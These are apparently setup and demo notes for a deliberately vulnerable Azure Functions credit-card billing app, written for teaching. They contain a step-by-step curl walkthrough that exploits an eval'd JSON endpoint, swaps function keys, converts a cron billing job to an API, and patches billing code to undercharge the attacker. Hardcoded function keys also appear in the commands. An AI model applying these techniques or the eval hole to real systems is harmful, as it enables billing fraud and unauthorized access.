Setup notes

- After deploying the .js files and package.json file for each function, you'll need to go into the scm console <appname.scm.azurewebsites.net/DebugConsole>, go into the home/site/wwwroot/<functionName> directory and run `npm install`.  It'll take a long time.

- Sometimes calls to the API just seem to fail.  Can't reproduce locally.  Not sure, just try again.

- I've included all sorts of creds directly in source out of ~~laziness~~expediency.

- Running the below steps will leave the app in the broken state.  I haven't yet written easy scripts to reset things to 'beginning' state:
  * Billing needs function.json.bkup copied back over function.json
  * TotalView and Billing need their original creds (d:\home\data\Functions\secrets)
  * ?? (haven't fully tested)

-----------------------------------
Concept

Layout for the vulnerable app.

Maybe delivered with serverless?

Concept:
* This is a webapp to consolidate credit card payments.  
* Payments aggregate over the month, and at the end of the month a scheduled function sends a single bill out, thus avoiding additional credit card fees.

Endpoints / functions:
* Check my balance:
  * API endpoint
  * In:
    * The 'semi-public' key for the function
    * Their card number in json format {cardNumber: <cardnum>} which is eval'd
  * Returns: dates and amounts of purchases
  * This is the vulnerable endpoint
* Check what will be paid at the end of the month:
  * API endpoint
  * Requires master (or 'more secret') key to use
  * Returns dict of card #s to payments processed
* Billing function:
  * Cron for once monthly
  * Per customer, sums costs and then sends the bill out
  * Marks as billed? (allowing spoofing)
* API endpoint for writing charges? (not implemented yet, maybe unneccesary)
  * Change code to not accept your credit card?

Exploitation path:
* Discover arbitrary code execution in initial API endpoint:
  * Since path is read-only, we're not too worried about breaking things
  * exploit is just eval'ing some JSON to make things super simple
  * Information gained:
    * Master key / secure key (encrypted, haven't dug into how to decrypt)
    * List of other functions (we didn't know about the other ones)
    * General access
* Dump sources of other functions as wanted
* Take key
  * Use to trigger the general 'card info' function
* Modify billing function:
  * Change it from cron to API
  * Trigger billing at arbitrary times
  * Change source of billing function to only bill me $1
* Change source of 'charge writing' API to not accept my card (or someone else's?) (if fn exists)

SQL schema:
* Cards: ID, card#, API key
* Purchases: ID, CardID, Time, $amount

----------------------------

Routes: (plug the relevant keys in for your own? functions app)

vuln_api: takes your credit card #, returns just your charges.
curl -X POST -d @benign.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: [{"amount":24.99,"date":"2017-06-15T00:00:00Z"},{"amount":5.99,"date":"2017-06-17T00:00:00Z"}]

totalView: Doesn't take any arguments.  Returns the list of all charges.
curl -X POST -d '{}' -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/TotalView?code=NKsfko79s6xRHgi838kqeoycX6Jk7gaALAY0Gwdb65afCETnY02pXA==
example: [{"card_id":1,"amount":24.99,"date":"2017-06-15T00:00:00Z"},{"card_id":1,"amount":5.99,"date":"2017-06-17T00:00:00Z"},{"card_id":2,"amount":8,"date":"2017-06-16T00:00:00Z"},{"card_id":2,"amount":29,"date":"2017-06-18T00:00:00Z"},{"card_id":2,"amount":0.99,"date":"2017-06-18T00:00:00Z"}]

billing: Sums up the cards to do the billing.  Can't be triggered via API, is triggered via cron.

Vulns:
curl -X POST -d @print_return.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: "hax!"

List available functions with secret sets via list_functions:
curl -X POST -d @list_functions.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: ["billing.json","host.json","httptriggerjs2.json","manualtriggerjs1.json","publicvuln.json","timertriggerjs1.json","totalview.json","totalview.json.bkup","totalview.json.orig"]

Try to run totalview:
curl -X POST -d '{}' -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/TotalView?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: this doesn't work because we don't have the key!

Change permissions on totalview: (they keys on disk are encrypted, but they're all encrypted against the same key, so we can just copy in our known working one!)
curl -X POST -d @change_totalview_perms.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: "done"

After changing perms, run totalView again:
curl -X POST -d '{}' -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/TotalView?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: [{"card_id":1,"amount":24.99,"date":"2017-06-15T00:00:00Z"},{"card_id":1,"amount":5.99,"date":"2017-06-17T00:00:00Z"},{"card_id":2,"amount":8,"date":"2017-06-16T00:00:00Z"},{"card_id":2,"amount":29,"date":"2017-06-18T00:00:00Z"},{"card_id":2,"amount":0.99,"date":"2017-06-18T00:00:00Z"}]

Now what's Billing - let's read its function metadata:
curl -X POST -d @read_billing_info.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: "{\r\n  \"bindings\": [\r\n    {\r\n      \"name\": \"myTimer\",\r\n      \"type\": \"timerTrigger\",\r\n      \"direction\": \"in\",\r\n      \"schedule\": \"0 0 0 1 * *\"\r\n    }\r\n  ],\r\n  \"disabled\": false\r\n}"

We can't call it by API since it's a cron job.  Let's change it to being API-able:
curl -X POST -d @change_billing_to_api.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==

Now change the permissions to use our known key like above:
curl -X POST -d @change_billing_perms.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==

Now we can query it via API:
curl -X POST -d @benign.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/Billing?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: [{"1234-5678-9012-3456":30.98},{"0000-0000-0000-0000":37.99}]

But we don't want to be billed, right?  Let's see how billing works by dumping the source:
curl -X POST -d @read_billing_source.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: <bunch of js source>

Now let's put in something for our card:
curl -X POST -d @patch_billing_code.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: "done"

And when we query billing again:
curl -X POST -d @benign.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/Billing?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
example: {"1234-5678-9012-3456":1,"0000-0000-0000-0000":37.99}


TODO:

- make it cooler by making vuln_api use an sql user that doesn't have creds to just do the further queries by itself (so we have to gain access to totalView)
